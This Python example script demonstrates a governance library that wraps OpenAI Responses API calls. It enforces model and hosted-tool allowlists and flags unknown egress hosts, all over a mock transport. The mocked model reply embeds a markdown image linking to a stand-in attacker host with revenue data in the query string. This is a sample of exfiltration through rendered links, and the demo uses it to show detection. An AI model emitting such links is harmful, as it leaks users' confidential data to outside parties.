"""Governing what client-side wrappers can't see: the OpenAI Responses API,
streaming, and tools the *provider* runs.

`marshal_ai.integrations.enable()` patches every model-call entry point
the SDKs expose — not just `create()`. Before v0.13, `responses.create`,
`.parse()` and `.stream()` all went around it. And provider-hosted tools
(web search, code interpreter, hosted MCP) execute on OpenAI's side, where
no `ToolGuard` can ever see them run — the only place to govern them is
the request that turns them on.

Uses the real `openai` client over an in-process mock transport: every
line of the SDK runs, nothing leaves this machine, no API key needed.

Run: python examples/hosted_tools_example.py
"""

import json

import httpx
import openai

import marshal_ai.integrations as marshal_integrations
from marshal_ai import (
    AllowlistModelPolicy,
    EgressAllowlist,
    InMemoryAuditSink,
    ModelCallDenied,
    ModelCandidate,
    ModelGuard,
    Principal,
)

RESPONSE = {
    "id": "resp_1", "object": "response", "created_at": 0, "model": "gpt-5-mini", "status": "completed",
    "parallel_tool_calls": True, "tool_choice": "auto", "tools": [],
    "output": [{"type": "message", "id": "m1", "status": "completed", "role": "assistant", "content": [
        {"type": "output_text", "annotations": [],
         "text": "Summary ready. ![](https://tracker.evil.example/p.gif?d=Q3-revenue)"}]}],
    "usage": {"input_tokens": 42, "output_tokens": 12, "total_tokens": 54,
              "input_tokens_details": {"cached_tokens": 0}, "output_tokens_details": {"reasoning_tokens": 0}},
}
sent_requests: list[dict] = []


def fake_openai(request: httpx.Request) -> httpx.Response:
    body = json.loads(request.content or b"{}")
    sent_requests.append(body)
    if body.get("stream"):
        events = [
            {"type": "response.created", "sequence_number": 0, "response": {**RESPONSE, "status": "in_progress", "output": []}},
            {"type": "response.completed", "sequence_number": 1, "response": RESPONSE},
        ]
        sse = "".join(f"event: {e['type']}\ndata: {json.dumps(e)}\n\n" for e in events)
        return httpx.Response(200, text=sse, headers={"content-type": "text/event-stream"})
    return httpx.Response(200, json=RESPONSE)


sink = InMemoryAuditSink()
guard = ModelGuard(policy=AllowlistModelPolicy({"chat": [ModelCandidate("gpt-5-mini")]}), audit_sink=sink)
marshal_integrations.enable(
    guard,
    Principal("research-agent"),
    hosted_tools={"web_search"},  # web search yes; code interpreter, hosted MCP, ... no
    egress_allowlist=EgressAllowlist(["*.ourcompany.example"]),
)
print("governed entry points:", len(marshal_integrations.patched_methods()))
client = openai.OpenAI(api_key="sk-demo", http_client=httpx.Client(transport=httpx.MockTransport(fake_openai)))

print("\n=== 1. Responses API: routed and audited ===")
response = client.responses.create(model="chat", input="Summarize Q3")
print("requested 'chat', actually sent:", sent_requests[-1]["model"])

print("\n=== 2. .stream() — previously a bypass — is governed too ===")
try:
    client.responses.stream(model="gpt-4-unapproved", input="hi")
except ModelCallDenied as e:
    print("blocked before any request:", e.reason)
with client.responses.stream(model="chat", input="hi") as stream:
    print("allowed stream completed:", stream.get_final_response().status)

print("\n=== 3. provider-hosted tools are allowlisted at the request ===")
client.responses.create(model="chat", input="news?", tools=[{"type": "web_search"}])
print("web_search: allowed")
before = len(sent_requests)
try:
    client.responses.create(model="chat", input="run this", tools=[{"type": "code_interpreter", "container": {"type": "auto"}}])
except ModelCallDenied as e:
    print("code_interpreter:", e.reason, "| requests sent:", len(sent_requests) - before)
try:
    client.responses.create(model="chat", input="x", tools=[
        {"type": "web_search"},
        {"type": "mcp", "server_label": "notes", "server_url": "https://mcp.random-host.example/sse"},
    ])
except ModelCallDenied as e:
    print("hosted mcp:", e.reason)

print("\n=== 4. links to unknown hosts in model output are flagged ===")
for entry in sink.all_entries():
    if entry.to_dict()["kind"] == "egress":
        print(f"  model output pointed at {entry.hosts} ({entry.action}) — host only, never the query string")
        break

marshal_integrations.disable_all()
